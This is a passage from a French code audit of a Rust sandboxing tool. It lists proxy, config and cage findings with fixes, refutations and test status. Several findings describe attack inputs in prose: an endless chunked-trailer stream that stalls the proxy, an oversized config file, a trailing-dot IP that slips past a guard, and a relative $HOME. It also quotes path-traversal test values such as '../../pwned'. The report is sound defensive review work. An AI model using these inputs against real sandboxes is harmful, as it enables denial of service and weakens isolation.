La requête est retirée du **côté requête** par `canonical_segments` mais conservée telle quelle dans le champ `path` de la règle : la règle n'apparie donc que `/exec`, tout en s'affichant dans `sbx test net` sous une forme qui décrit autre chose que ce qu'elle a apparié. Une règle écrite pour être étroite est en fait large. **Correctif :** refuser un `?` dans le chemin d'une règle, comme un hôte `*.domain` avec un chemin est déjà refusé une ligne plus haut.

---
---

### `src/sandbox/proxy/wire.rs:377` — la section de trailers d'un corps chunked n'est bornée ni en nombre de lignes ni par une échéance
*security*

**Scénario :** après le chunk de taille zéro, la boucle de trailers lit ligne à ligne avec `read_line_bounded(r, CHUNK_LINE_MAX)` — chaque *ligne* est plafonnée à 8 KiB, mais leur **nombre** ne l'est pas. Une cage qui envoie `0\r\n` puis un flux sans fin de `x: y\r\n` garde le fil du proxy dans cette boucle indéfiniment, tout en occupant un jeton de `ctx.conns`. Comme le pair écrit en continu, aucun délai de lecture ne se déclenche.

**Vérif :** le contraste est interne au fichier : la tête a **et** un plafond de taille (`HEAD_MAX`) **et** une échéance (`head_deadline`) ; le corps a un plafond ; la section de trailers n'a ni l'un ni l'autre — et ces octets sont de toute façon jetés.

---
---

### `src/config/safety.rs:86` — la lecture d'une config contrôlée par l'attaquant n'est pas bornée en taille
*security*

**Scénario :** un dépôt livre un `.sbx.toml` de plusieurs gibioctets fait d'une seule longue ligne de commentaire (il se compresse à quelques mébioctets dans le pack git, donc le clone reste peu coûteux). Toute invocation de sbx dans ce répertoire — `sbx run`, `sbx config show`, une intégration d'invite shell, et même `sbx trust` — appelle `read_safe_bytes`, qui fait un `read_to_end` sans plafond. **Correctif :** lire à travers `f.take(MAX_CONFIG_BYTES + 1)` et refuser au-delà, en réutilisant la forme de refus existante.

---
---

### `src/config/secrets.rs:192` — le `name` par défaut d'un secret (la clé de section `to`) échappe à `validate_secret_name`
*anomaly*

**Scénario :** une section `[secret."api.example.com/…"]` dont le chemin porte des octets de contrôle passe `classify`, et le nom dérivé — non validé — est ensuite rendu dans les diagnostics et les placeholders. **Correctif :** faire passer le nom par défaut par la même porte, ou le dériver de la composante hôte de la règle classifiée plutôt que de la clé brute.

---
---

### `src/sandbox/cgroup.rs:372` — `cage_scope_dirs` parcourt la tranche de *tous* les utilisateurs
*bug*

Le commentaire dit que la marche est enracinée sur la tranche de cet uid ; le code parcourt `user.slice` entier, donc un scope d'un autre utilisateur portant le même pid peut masquer celui de cette session. **Correctif :** enraciner sur `user-<uid>.slice`, ce que la doc annonce déjà.

---
---

### `src/sandbox/proxy/mod.rs:444` — le garde-fou d'IP littérale au CONNECT teste l'hôte brut, pas la forme canonique
*anomaly*

**Scénario :** `connect_host` est calculé une ligne plus haut, puis le refus teste `host.parse::<IpAddr>()` sur la forme **brute**. `canonical_host` retire les points finaux, donc `127.0.0.1.` échoue à l'analyse brute et passe le garde-fou, alors que la forme canonique est bien une IP littérale.

**Vérif :** je descends la gravité proposée (medium security). Il n'y a pas de contournement de politique : le verdict est ensuite rendu sur `connect_host`, donc une règle nommant `127.0.0.1` reste nécessaire, et le tunnel exige que le SNI corresponde à `connect_host`. Ce qui est contourné, c'est le refus « une cible IP littérale ne porte pas de SNI » — donc une incohérence entre la valeur testée et la valeur journalisée, pas une ouverture. **Correctif :** tester `connect_host`, qui est déjà la chaîne journalisée et refusée.

---
---

### `src/sandbox/argv.rs:147` — `--die-with-parent` est émis inconditionnellement, y compris sur le chemin détaché qui orpheline bwrap délibérément
*bug* — verdict **PLAUSIBLE**

**Scénario :** `to_argv` pousse `--die-with-parent` pour toute spec, avec le commentaire « die with the launcher so no sandbox outlives sbx » — l'inverse exact de ce que `--detach` promet. Sur la branche sans garde de `detached_child` (`launch.rs:498-506`), le processus démon *devient* bwrap par `exec`, donc son parent est le `sbx` d'origine, que `detach_parent` n'attend délibérément pas. `--die-with-parent` arme alors `PR_SET_PDEATHSIG` contre ce parent, et la sortie du lanceur tue la cage.

Ce qui rend le cas désagréable est que c'est une **course** : l'octet de disponibilité est écrit *avant* l'`exec`, donc si le lanceur sort en premier le démon est déjà réattaché à init et le signal ne part jamais ; s'il sort après le `prctl` de bwrap, la session est tuée immédiatement. La branche supervisée juste en dessous est saine, et le chemin n'est atteignable que pour un lancement détaché sans garde — ce qui demande `network = "none"` ou `"shared"` et aucun broker, tâche, forward, ssh-agent, portail ni supervision.

**Vérif :** le vérificateur adverse n'a pas pu établir la séquence de bout en bout et l'a classé PLAUSIBLE. Je le laisse à ce statut plutôt que de le présenter comme acquis : la lecture est cohérente et le correctif est peu coûteux, mais rien ici ne l'a reproduit.

**Correctif :** faire de `--die-with-parent` une propriété de la spec plutôt qu'un inconditionnel, et la retirer sur le chemin détaché ; ou faire que `detached_child` prenne toujours la branche supervisée, ou double-forker pour que le parent de bwrap soit init avant le `prctl`.
---

### `src/allowlist/mod.rs:426` — une règle `re:` ancrée sur `http://` ne peut jamais apparier
*anomaly* — l'URL comparée est toujours reconstruite avec le schéma `https`, y compris pour une requête cleartext, donc `deny = ["re:^http://internal\\.corp"]` — la forme naturelle pour reprendre un hôte cleartext qu'on vient d'ouvrir — n'apparie rien et ne dit rien. Soit refuser à l'analyse un motif `re:` ancré sur un schéma autre que `https`, soit énoncer la reconstruction là où l'auteur de la règle la lira.
---

### `src/allowlist/mod.rs:475` — `matches_mute` lit son jeu de méthodes par la question du côté *allow*
*anomaly* — même dissymétrie que le finding sur `explain_clear`, dans l'autre sens et sans conséquence de verdict : un `mute` d'hôte nu ne fait jamais taire un refus WebSocket, alors qu'un mute est large par construction sauf si l'opérateur l'a restreint. Utiliser `admits_deny`, ou le dire dans la doc.
---

### `src/allowlist/mod.rs:1093` — `capture_max_kb` est perdu sans un mot quand une couche redéclare `capture`
*bug* — `settings_dropped_from` énumère ce qu'une redéclaration fait tomber, et omet ce champ : l'opérateur voit son plafond de capture disparaître sans que le rapport des réglages perdus le nomme.
---

### `src/sandbox/proxy/mod.rs:990` — `Head::keeps_alive` lit le jeton de version avec `split_whitespace`
*anomaly* — c'est précisément la découpe que `request_line_parts` documente comme fausse (le pair découpe sur SP, pas sur « n'importe quel blanc »), corrigée ailleurs dans cette même branche. Deux lecteurs de la même ligne de requête, deux découpes. — verdict **PLAUSIBLE**
---

### `src/sandbox/proxy/wire.rs:445` — `parse_chunk_size` accepte une taille signée ou entourée de blancs
*anomaly* — exactement la latitude de grammaire que `content_length`, dans le même fichier, a été écrite pour refuser. Valider `1*HEXDIG` avant de convertir.
---

### `src/sandbox/deb.rs:692` — le suffixe `.deb` est apparié sans tenir compte de la casse à la sélection, et avec la casse à la validation
*anomaly* — un asset nommé `…​.DEB` est donc sélectionné puis refusé net. Les deux backends voisins font l'appariement insensible des deux côtés.
---

### `src/config/load.rs:921` — `DESCRIBED` liste `"uses"` alors que la clé sérialisée est `"use"`
*anomaly* — le filtre n'apparie donc jamais, et `sbx app import` invite à aller lire une section qu'il vient d'afficher en entier. Le même défaut masquerait une clé réellement non décrite.
---

### `src/config/overrides.rs:272` — `std::env::vars()` panique sur une variable d'environnement non-UTF-8
*bug*

**Repro :** mesuré contre le binaire de cette branche —

```
$ MAIL=/var/mail/jos\xe9  sbx config show
  exit: 101
  thread 'main' panicked at library/std/src/env.rs:162:
  called `Result::unwrap()` on an `Err` value: "/var/mail/jos\xE9"
```

Tous les verbes sont touchés, le balayage des surcharges ayant lieu avant le dispatch. Une `MAIL` en latin-1, une `LESSOPEN` écrite par un script ancien, ou n'importe quelle variable portant un chemin non-UTF-8 suffit. L'incohérence interne est ce qui en fait clairement un défaut : `src/main.rs:48` lit ses propres arguments avec `args_os` **et dit pourquoi** — « a command run via `sbx run` may carry non-UTF-8 arguments, and panicking on them would be wrong » — et `overrides.rs:272` est le seul `env::vars()` du code hors tests. Correctif : `vars_os()`, en sautant ce qui ne se convertit pas ; les noms que sbx cherche sont ASCII par construction.
---

### `src/sandbox/argv.rs:29` — `compose` réécrit *tout* élément d'argv égal au marqueur de descripteur
*bug* — la substitution se fait par égalité de valeur sur tout le vecteur, qui contient aussi la commande de la cage et chaque chemin de bind. `sbx run -- printf '%s\n' @sbx-env-args` imprime un numéro de descripteur. La propriété annoncée du marqueur (« bwrap refuses it loudly instead ») ne vaut que pour la case que `to_argv` a posée. Correctif : réécrire l'indice connu, et vérifier qu'exactement une substitution a eu lieu.
---

### `src/sandbox/argv.rs:82` — un NUL dans un *nom* est rapporté comme « the value of `<key>` », et le message imprime la charge utile qu'il refuse
*anomaly* — le refus existe parce qu'un NUL découperait l'argument ; le message imprime alors la clé empoisonnée en entier. Distinguer les deux moitiés et n'imprimer qu'une forme tronquée pour le cas du nom.
---

### `src/sandbox/attach.rs:95` — le pidfd est ouvert après la découverte, donc l'affirmation « un pid réutilisé ne peut jamais être joint par erreur » ne tient pas
*anomaly* — verdict **PLAUSIBLE** — entre la découverte et l'ouverture, le pid peut avoir été recyclé ; le pidfd épingle alors le mauvais processus, avec la même autorité. Enregistrer les inodes de namespace à la découverte et les revérifier à travers `/proc/self/fd/<pidfd>/ns/*`.
---

### `src/sandbox/binds.rs:1545` — le routeur d'URL ne devient exécutable qu'après le renommage
*bug* — `write_atomic` écrit le fichier temporaire en `0644` puis renomme, et le `set_permissions(0o755)` vient après : une cage concurrente peut l'exécuter en `0644` pendant l'intervalle. Poser le mode sur le fichier temporaire avant le renommage.
---

### `src/sandbox/binds.rs:2001` — l'assertion « identifiant dégénéré » du machine-id compare à un littéral de 33 caractères
*anomaly* — `sha256("")[..32]` fait 32 caractères et la même fonction assère `body.len() == 32` deux lignes plus haut : l'`assert_ne!` ne peut donc jamais échouer. Un test qui garde exactement ce qu'il a été écrit pour garder — moins un caractère.
---

### `src/sandbox/cgroup.rs:110` — `is_valid_memory_value` accepte des quantités que systemd refuse
*bug* — la vérification est syntaxique, donc `memory_max = "99E"` passe puis fait échouer chaque lancement du projet à la création du scope. Vérifier que nombre × suffixe tient dans un `u64`.
---

### `src/sandbox/proc_enforce.rs:1302` — la re-sonde `O_NOFOLLOW` répond `ELOOP` pour des errnos qui décrivent le superviseur
*bug* — `EMFILE` ou `ENOMEM` côté hôte sont rendus à la cage comme « ce chemin est un lien symbolique ». Ne répondre `ELOOP` que pour les errnos qui décrivent le fichier, et retomber sur `CONTINUE` sinon.
---

### `src/sandbox/seccomp.rs:1287` — le commentaire dit `EFAULT`, le test qu'il documente assère `EINVAL`
*anomaly* — dérive prose/code sur la sémantique d'un `clone3` relevé.

### Les autres findings LOW

Chacun est passé devant un réfuteur et en est ressorti CONFIRMED (ou PLAUSIBLE, marqué comme tel). Ils sont en tableau plutôt qu'en prose parce que le fichier et la ligne suffisent à les retrouver ; la gravité indiquée est celle que le réfuteur a retenue, pas celle que l'auteur proposait.

| Emplacement | Type | Ce qui ne va pas |
|---|---|---|
| `src/cli/completion.rs:766` | bug | Optional-value boolean flags are modelled as consuming the next word; `sbx run --gpu <TAB>` offers a word the parser reads as the command |
| `src/cli/logs.rs:708` | bug | Merged `--follow` checks "all feeds ended" before writing the batch it just read, discarding those rows |
| `src/cli/mod.rs:479` | anomaly | The `logs` dispatch arm's `maybe_help` branch can never fire |
| `src/cli/proc.rs:405` | anomaly | Comment claims `sbx proc pending` refuses an unresolvable project; it never scopes by project at all |
| `src/cli/upgrade.rs:548` | bug | `plan_app_upgrade` walks the two package layers unmerged, so a name the app re-declares is counted twice |
| `src/help.rs:308` | anomaly | The `app run` page collapses the override flags into one row with no value grammar, so completion loses the `<name>` slot after any of them |
| `src/paths.rs:48` | anomaly | DATA_ENTRIES omits flake-inline/, so `sbx path`'s "every directory sbx owns" claim is false |
| `src/plugins/catalogue.rs:291` | security | A catalogue entry's `path` escapes the control-character guard applied to `version`/`description` and is echoed verbatim into a terminal |
| `src/plugins/mod.rs:537` | bug | Cross-type plugin-name conflict is missed when one type already has a same-name conflict, leaving a claimant live under a name reported as ambiguous |
| `src/plugins/stores.rs:1218` | duplication | Two byte-identical owner-only file writers, plus three copies of `unique()`, in a module that argues against exactly this |
| `src/plugins/stores.rs:36` | anomaly | `REPO_PUBKEY`'s doc enumerates its readers and is wrong about three of them, including `update` |
| `src/plugins/stores.rs:775` | security | The catalogue content pin is verified on the store checkout, never on the staged tree that is actually installed *(PLAUSIBLE)* |
| `src/sandbox/control/mod.rs:1120` | bug | A command that fills CMD_MAX without a newline is dispatched as if it were complete |
| `src/sandbox/launch.rs:3944` | anomaly | Four sbx: diagnostics bypass the diag:: chokepoint and lose identifier styling |
| `src/sandbox/notify_relay.rs:210` | security | Cage-authored `Notify` strings are forwarded to the host daemon with no length bound *(PLAUSIBLE)* |
| `src/sandbox/notify_relay.rs:373` | security | Every host `ActionInvoked` / `NotificationClosed` — including other applications' — is re-emitted into the cage unfiltered |
| `src/sandbox/observe_feed.rs:179` | security | The exec-feed plumbing filter keys on `comm`, a value the observed process itself chooses |
| `src/sandbox/proxy/h2mitm.rs:160` | anomaly | The h2 stream-cap refusal is recorded nowhere — no stat, no log, no notice |
| `src/sandbox/proxy/ssrf.rs:248` | bug | Only the first policy-permitted address of a multi-homed host is ever tried |
| `src/sandbox/proxy/websocket.rs:845` | bug | An interim 1xx before the 101 is mistaken for the upstream's final response |
| `src/sandbox/proxy/websocket.rs:863` | bug | A declined upgrade is framed as if the request were always GET, so a HEAD upgrade waits for a body that never comes |
| `src/sandbox/sshagent.rs:481` | anomaly | The "an empty request" refusal branch cannot fire from the socket path |
| `src/store.rs:323` | bug | LONGEST_SOCKET_SUFFIX understates the widest host socket path, so a data directory the guard accepts can still overrun sun_path |

---

## Duplication du code (10 familles)

Classée par *ce qui casse si une copie est corrigée et pas les autres*, pas par nombre de lignes.

### `src/sandbox/proxy/forward.rs:566-590` et `src/sandbox/proxy/tunnel.rs:846-878` — la queue de réponse du proxy est écrite deux fois

~28 lignes identiques : l'enregistrement du statut final, le déclencheur de rafraîchissement d'identifiant `401 && any_refreshable(..) -> ctx.credential_refused()`, et la pompe de corps dérivée/comptée/masquée par `masks_reflection`. C'est la duplication la plus risquée de l'arbre : elle porte une **décision de sécurité** (`masks_reflection`), donc un correctif qui atterrit sur un seul chemin est exactement la classe de défaut dont l'historique de cette branche est plein (« a message past the scan cap must not blind the ones behind it », « the proxy-hop credential does not go to the origin server »). Une fonction partagée prenant le lecteur et l'écrivain en paramètres supprime la divergence par construction.

### `src/sandbox/binary.rs:61,67,75` · `tarball.rs:66,72,79` · `appimage.rs:94,100,107` · `deb.rs:92,98,105` — les accesseurs de verrou des backends prebuilt, quatre fois

`pins`, `pinned_hashes` et `write_pins` sont douze délégations d'une ligne vers `prebuilt::{pins,pinned_hashes,write_pins}(.., &prebuilt::lock_file(&Marqueur))`, ne différant que par le type marqueur. Le trait `prebuilt::Kind` (`src/sandbox/prebuilt.rs:525`) existe déjà et est ce que ces quatre backends implémentent : ces fonctions sont des méthodes par défaut de ce trait. En prime, `binary::resolve_source` (`binary.rs:90-100`) et `tarball::resolve_source` (`tarball.rs:94-107`) sont *la même fonction* — un résolveur d'URL directe sans requête de source — qui appartient à `prebuilt` sous un `resolve_direct_url`.

### `src/sandbox/broker.rs:1000-1048` et `src/sandbox/signer.rs:470-513` — le lancement d'un plugin en cage, deux fois

~35 lignes : la paire de sockets et ses délais, le `resolver::CagePlan`, `compose_cage`, l'ordre clone-avant-spawn (dont le commentaire expliquant que `Drop` tue l'enfant est reproduit mot pour mot dans les deux), la remise de stdin/stdout sur une seule socket et la justification de `stderr(null)`. Ne diffèrent que par `PluginKind`, la constante de délai et l'étiquette d'erreur. Ce qui casse : les deux commentaires décrivent une **invariante de cycle de vie** (un `?` après le spawn laisserait un bwrap vivant) ; corriger cet ordre d'un seul côté le rétablit silencieusement de l'autre.

### `src/sandbox/launch.rs:2761-2802` et `src/sandbox/launch.rs:5802-5848` — deux séquences `openpty` + `fork`

~40 lignes de FFI `unsafe` chacune : la sonde `TIOCGWINSZ`, `openpty`, le `FD_CLOEXEC` sur le maître, le fork, et le `close(master)/close(slave)` du chemin d'erreur. Dupliquer du `unsafe` est le cas où la duplication coûte le plus cher. Les deux ignorent d'ailleurs le résultat du couple `fcntl(F_GETFD)`/`fcntl(F_SETFD)` dont le commentaire dit qu'il est ce qui garde le maître du pty hors de la cage (inoffensif en pratique — l'enfant referme le maître explicitement — mais l'affirmation du commentaire n'est pas vérifiée).

### `src/cli/task.rs:176` définit `layout_or_fail`, et treize sites le réécrivent à la main

`fn layout_or_fail() -> Result<store::Layout, ExitCode>` existe déjà. Le même `let Some(layout) = Layout::from_env() else { …même phrase…; return FAILURE }` est écrit en clair en `src/cli/proc.rs:481,538,623,732`, `src/cli/search.rs:21`, `src/cli/upgrade.rs:183`, `src/cli/session.rs:70,512`, `src/cli/logs.rs:93,564` et `src/sandbox/launch.rs:2621,2927,3119`. Les trois derniers utilisent `eprintln!` au lieu de `diag::error` (voir la section anomalies).

### `src/cli/net.rs:3126-3147` et `src/cli/proc.rs:270-291` — le préambule de filtres pid des deux verbes d'écriture de règle

`egress_data_dir()` puis les filtres pid projet/app, commentaire compris.

### `src/cli/logs.rs:563-580` et `src/cli/proc.rs:622-640` — le préambule de cible de session des deux verbes de lecture

Layout, `session::Registry::at(..).list()`, `resolve_session_target`.

### `src/help.rs:2310` et `src/help.rs:2378` — le texte d'aide de l'option `<rule>` est une chaîne de 600 caractères écrite deux fois

Les deux sont **identiques octet pour octet** (`net allow` et `net deny`) ; `src/help.rs:2444` est la forme courte, déjà divergente, pour `net mute`. Une `const` partagée garde les trois en phase — et `src/help.rs` est, de l'aveu de `CLAUDE.md`, la source de vérité unique dont dérivent `--help`, les synopsis d'erreur et la complétion.

### `src/plugins/stores.rs:1218` — deux écrivains de fichier « propriétaire seul » octet pour octet identiques, plus trois copies de `unique()`

Rapporté par l'auditeur de la chaîne d'approvisionnement, dans un module qui par ailleurs factorise avec soin. Le point qui compte n'est pas la longueur : ce sont des écrivains qui posent un mode de permission, donc deux endroits où corriger un mode, et un seul corrigé laisse l'autre en place.

### `src/cli/config.rs:4222, 4346, 4512, 4603, 4738, 4873` — six copies d'un littéral `ConfigView` de ~33 lignes

Fixture de test, chaque copie ne changeant qu'un ou deux champs. Retenu ici parce que la duplication d'une fixture est dangereuse quand elle est aussi répétée : ajouter un champ à `ConfigView` demande six éditions, et n'en faire que cinq laisse un test qui compile en affirmant l'ancienne forme. Un constructeur, ou un `Default` pour la vue de test, replie ~200 lignes.

---

## Optimisations

La marge est étroite, et c'est un résultat. Le code est déjà écrit avec le coût en tête, et les commentaires en portent les mesures : le refus argumenté d'un `#[global_allocator]` dans `Cargo.toml`, les 32 ms pour 100 masques dans `fs.md`, la borne de 200 ms sur la réécriture du fichier de statistiques. Un passage `clippy -W pedantic -W nursery` sur tout l'arbre produit 2793 avertissements dont il ne reste presque rien après tri (le détail est en fin de rapport).

Le seul poste retenu après réfutation est celui-ci, et il est déjà en MEDIUM sous l'angle de la disponibilité :

### `src/sandbox/proxy/mod.rs:761` — le `connect(2)` non borné coûte des fils, pas seulement du temps

Chaque connexion vers un hôte autorisé qui absorbe les SYN immobilise un fil du proxy pendant ~130 s pour un travail nul, jeton `ctx.conns` compris. C'est le poste de coût le plus concret trouvé dans l'arbre, et le correctif — `connect_timeout`, de la bibliothèque standard — est de trois lignes.

Deux candidats ont été **réfutés** et retirés : le cache de feuilles TLS (`proxy/ca.rs:133`) et le plafond par hôte des statistiques d'egress (`egress_stats.rs`). Dans les deux cas le comportement est décrit à son site, avec l'acteur nommé et le compromis défendu, et ma formulation — « une cage peut le neutraliser pour la session » — était fausse : les entrées déjà en cache continuent de servir, seuls les hôtes vus après le plafond paient, et celui qui paie est la cage qui a provoqué le remplissage.

---

## Zones auditées sans finding retenu

Dire où l'audit n'a **rien** trouvé a autant de valeur que la liste des défauts, parce que c'est ce qui borne ce que ce rapport prétend couvrir.

- **`src/sandbox/openpgp/` (438 lignes) — la clé de voûte cryptographique.** Lu intégralement. La numération de paquets refuse les longueurs partielles et indéterminées ; `parse_signature` exige *exactement un* paquet et *exactement une* signature, donc « accepter si une signature vérifie » n'est pas atteignable ; le bloc de queue v4 (`0x04 0xff` + longueur des données hachées) est construit correctement ; les deux formes de longueur de sous-paquet (`192..=254` à deux octets) sont correctement distinguées de celles des paquets (`192..=223`, `255`), ce qui est subtil et juste ; `RSA_PKCS1_2048_8192_SHA*` impose un module de 2048 bits au moins ; l'empreinte est comparée **avant** que la clé n'atteigne le vérifieur ; `split_clearsigned` produit le texte signé et le texte lu depuis les *mêmes* lignes, donc les deux ne peuvent pas diverger ; la malléabilité de base64 est inerte puisque le résultat est soit haché, soit vérifié.
- **`proc-shim/` (378 lignes) — le shim d'application en cage.** Lu intégralement. L'arithmétique de saut du filtre BPF est correcte, y compris le bloc x32 placé avant le contrôle d'architecture et la formule `jt = n - idx` pour les comparaisons ; l'analyse d'arguments ne peut pas confondre un `--` de la charge utile avec le séparateur ; chaque chemin d'échec avant l'`execvp` échoue fermé ; un `sendmsg` qui n'aurait pas transmis le descripteur aboutit à un filtre démonté et donc à un `execve` refusé, ce qui est le bon sens de la panne.
- **`src/config/safety.rs`** — la porte d'ouverture décide sur un `fstat` du descripteur déjà ouvert, donc les métadonnées contrôlées et les octets lus appartiennent au même inode ; l'ouverture `O_NONBLOCK` empêche une FIFO sans écrivain de bloquer avant le refus. Le seul défaut de la zone est ailleurs — l'absence de `O_NOFOLLOW`, traitée dans le finding sur `trust.rs`.
- **La validation des noms d'app.** Mesurée : `../../pwned`, `..`, `a/b`, un retour à la ligne, une espace, la chaîne vide et `.` sont tous refusés avec le message « 1–64 of [A-Za-z0-9._-], not `.`/`..` ». Rien ne sort du répertoire de profils. (`-x` est accepté ; sans conséquence, sbx construisant des tableaux d'argv et non des lignes de shell.)
- **Le normaliseur de chemin de l'allowlist, pour ce qu'il couvre.** `..`, `%xx`, `//`, la barre finale et la casse d'hôte sont tous traités correctement — mesuré, pas déduit. `*.corp.example.com` refuse `evil-corp.example.com` et `xcorp.example.com`. Les manques sont `;params` et `#fragment`, traités comme finding.
- **`ConnCap` et la boucle d'acceptation du proxy.** Le motif « prendre le jeton *est* le test » de `conncap.rs:64` est correct, et le compteur en clair de la boucle du proxy (`proxy/mod.rs:261`) n'est pas la course que `ConnCap` corrige, la boucle d'acceptation étant à fil unique — l'en-tête de `conncap.rs` dit d'ailleurs explicitement que le proxy et le plan de contrôle portent cette défense en ligne, délibérément.
- **Les bornes mémoire des journaux et compteurs.** `LOG_RING_CAP = 1000` est un anneau ; `MAX_HOSTS = 256` avec un seau `overflow` qui préserve les totaux. Le seul reproche est la politique de remplacement, traitée en optimisation.
- **La redaction des sorties de tâche.** `redact_named` reconstruit le tampon une fois par aiguille, donc en O(aiguilles × tampon) ; examiné puis **non retenu**, le tampon étant plafonné à `max_output` (64 KiB par défaut, `config/tasks.rs:124`) plus une marge de scan. Le point notable de cette zone est correct et vaut d'être dit : la marge existe précisément pour qu'un identifiant à cheval sur le plafond soit entier au moment du scan.

## État de la branche

Mesuré sur `d717a05` avec la chaîne d'outils épinglée (rustc 1.97.1) :

```
cargo fmt --all --check                       OK
cargo fmt --manifest-path proc-shim/…         OK
cargo clippy --all-targets -- -D warnings     OK
cargo test --bins        2745 passed; 0 failed; 7 ignored
```

Les 7 tests `#[ignore]` sont tous étiquetés mesure ou benchmark (`bench.rs`, `proc_enforce.rs:4547`) — aucun test d'assertion n'est désactivé. 78 sauts ont été enregistrés dans `SBX_SKIP_LOG`, chacun avec sa raison (pas de userns, pas de nix, pas de session systemd sur cette machine) : c'est exactement le mécanisme de saut honnête que le dépôt décrit, et non des tests silencieusement verts. Un balayage de tout l'arbre à la recherche de tests sans assertion n'en trouve que trois, tous dans `bench.rs`, où l'absence d'assertion est le propos.

---

## Les 8 PLAUSIBLE, tranchés

Un verdict PLAUSIBLE n'est pas un verdict. Chacun des huit a donc été repris après la passe de réfutation, avec la question précise que le réfuteur avait laissée ouverte. Aucun ne s'est effondré ; un s'est durci en confirmé mesuré, et un seul change de nature — son correctif n'est pas du code.

| # | Finding | Après analyse | Suite |
|---|---|---|---|
| 1 | `src/store.rs:404` — `$HOME` relatif accepté | **confirmé, mesuré** | corriger |
| 2 | `src/sandbox/proxy/ssrf.rs:60` — IPv6 compatible-IPv4 | faits acquis, portée non démontrée | corriger (3 lignes) |
| 3 | `src/sandbox/proxy/mod.rs:990` — `split_whitespace` | divergence réelle mais étroite | corriger |
| 4 | `src/sandbox/notify_relay.rs:210` — `Notify` non borné | nuisance, pas franchissement | corriger (plafond) |
| 5 | `src/plugins/stores.rs:775` — pin vérifié sur le checkout | fenêtre étroite, contredit la règle du module | corriger |
| 6 | `src/sandbox/attach.rs:95` — pidfd après découverte | écart doc/code, pas de mauvais rattachement démontré | corriger |
| 7 | `src/sandbox/argv.rs:147` — `--die-with-parent` détaché | course latente réelle, jamais observée | corriger |
| 8 | `src/sandbox/proc_enforce.rs:1273` — `openat2 resolve` | réel ; « doc seulement » à l'analyse, corrigé en code à la passe suivante | corriger |

**`store.rs:404` est le seul que l'analyse fait passer de PLAUSIBLE à confirmé.** Le maillon que le réfuteur n'avait pas fermé était « un `$HOME` relatif est-il seulement atteignable ». Mesuré contre le binaire de cette branche :

```
HOME=.             sbx path -> data: ./.local/share/sbx
HOME=              sbx path -> data: .local/share/sbx
HOME=../elsewhere  sbx path -> data: ../elsewhere/.local/share/sbx
```

Le répertoire de données — donc le store, les engines, les plugins, la CA du proxy et les sockets de contrôle — se résout alors contre le cwd, qui pour `sbx run` est le répertoire du projet, c'est-à-dire l'attaquant. `SBX_DATA_DIR` et `XDG_DATA_HOME` sont tous deux contrôlés absolus au même endroit ; `$HOME` ne l'est pas, et `trust.rs:169` fait exactement ce contrôle sur cette même variable, motif écrit à l'appui.

**`proc_enforce.rs:1273` est celui sur lequel l'analyse s'est arrêtée trop tôt, et il faut le dire aussi.** Le réfuteur avait fermé le point que l'auditeur n'avait pas vu : servir le descripteur de la sonde à un appelant qui a demandé `RESOLVE_NO_SYMLINKS` (ou `RESOLVE_BENEATH`, ou `RESOLVE_IN_ROOT`) lui remettrait précisément la résolution que sa propre restriction devait refuser. L'analyse en a conclu qu'aucun correctif de code n'était sain et qu'il fallait corriger la prose. La première moitié du raisonnement était juste ; la conclusion ne l'était pas.

Car `resolve` est lu dans la mémoire de la cage, et le décliner en bloc faisait du repli `CONTINUE` un choix que la cage pose elle-même : un `RESOLVE_NO_XDEV` d'apparence anodine suffisait à sortir **toutes** ses ouvertures autorisées de la remise du descripteur pour les remettre sur la seconde résolution qu'un thread frère peut détourner — la fenêtre même que la lentille existe pour fermer, rouverte à la demande de l'appelant.

La passe de correction a donc partagé le mot au lieu de le refuser. Les bits qui ne changent pas *quel fichier* la marche peut atteindre (`RESOLVE_NO_XDEV`, `RESOLVE_NO_MAGICLINKS`, `RESOLVE_CACHED`) sont servis depuis la sonde ; les trois qui le changent restent déclinés ; un bit inconnu est décliné également, puisque le noyau répond `EINVAL` à un `resolve` qu'il ne connaît pas et qu'il n'existe alors aucun appel dont un descripteur pourrait être la réponse. Le prix est écrit sur place et dans le guide plutôt que tu : un appelant qui a demandé `RESOLVE_NO_XDEV` ou `RESOLVE_NO_MAGICLINKS` peut recevoir un descripteur que le noyau lui aurait refusé, une perte de fidélité à l'intérieur d'une cage qui confie déjà à `sbx` la résolution de ses ouvertures.

`docs-site/docs/guide/configuration/fs.md` a donc été corrigée deux fois. D'abord parce qu'elle affirmait « One gap is left, and it is not one a cage can arrange » quand le code décrivait une seconde lacune que la cage arrange en choisissant la forme de son appel système. Puis pour nommer les trois bits qui déclinent réellement, une fois le code changé.

---

## Les 17 findings réfutés

Une réfutation est un résultat, pas un échec, et la taire donnerait une fausse idée du bruit. Chacun figurait dans une version précédente de ce rapport ; aucun n'y figure plus. La conclusion citée est celle du réfuteur.

- **`build.rs:121`** — The inherited cargo environment scrub does not achieve what its comment claims
  <br/>*Réfuté :* … The auditor agrees these must not be removed. So the code does what the comment says, the residual inheritance is required for correctness rather than an overlooked leak, and 'stand alone' read against its own enumerated list is accurate as written. No defect and no reader misled into a harmful conclusion.

- **`src/allowlist/mod.rs:1433`** — The documented "a deny that names a scheme binds only that plane" rule is false for `https://`, the one scheme that is indistinguishable from no scheme
  <br/>*Réfuté :* … The scheme-scoping claim applies to the inspected plane only (explain filters `r.layer == Layer::L7` at 1441), where `https://h` and bare `h` being one rule is documented as intended in split_scheme (grammar.rs:106-108). Nothing behaves contrary to what is written; at most the test's *name* is loose, and the observed effect is fail-closed.

- **`src/cli/app.rs:884`** — `app export --out` writes a verbatim copy of a 0600 profile at the umask's mode
  <br/>*Réfuté :* … ibes — an implicit snapshot sbx makes on its own, at a path sbx chooses, beside a file it is about to destroy — and its wording ("three call sites") shows the sites were enumerated deliberately. Finally, the exported bytes are the profile as authored (`export_profile`, src/config/load.rs:1365-1389): `[secret]` *locators*, binds and allow rules, not secret material, and it is the content the user is exporting in order to share.

- **`src/cli/completion.rs:137`** — `insertable` lets glob metacharacters through, so a completed egress rule breaks the command line
  <br/>*Réfuté :* … In bash, an unmatched glob is left verbatim (no `failglob`/`nullglob` by default), so the word reaches sbx as typed; the auditor's worst case leans on a "catch-all `*` rule" that the rule grammar documented at src/help.rs:2310/2378/2444 does not list (the documented wildcard forms are `*.domain` and `:*`, neither of which is a bare `*`).

- **`src/cli/net.rs:3187`** — `sbx net allow|deny --session` exits 0 when the rule reached no session, unlike its proc twin
  <br/>*Réfuté :* … launch one with [proc] mode = enforce/ask'), while net's empty case also covers the refused-by-older-server path (net.rs:3245-3252 suppresses the 'nothing to load' sentence when `refused` is non-empty) and still exits 0. This is a pinned design choice, not an oversight; at most it is a low-severity UX inconsistency, not a bug.

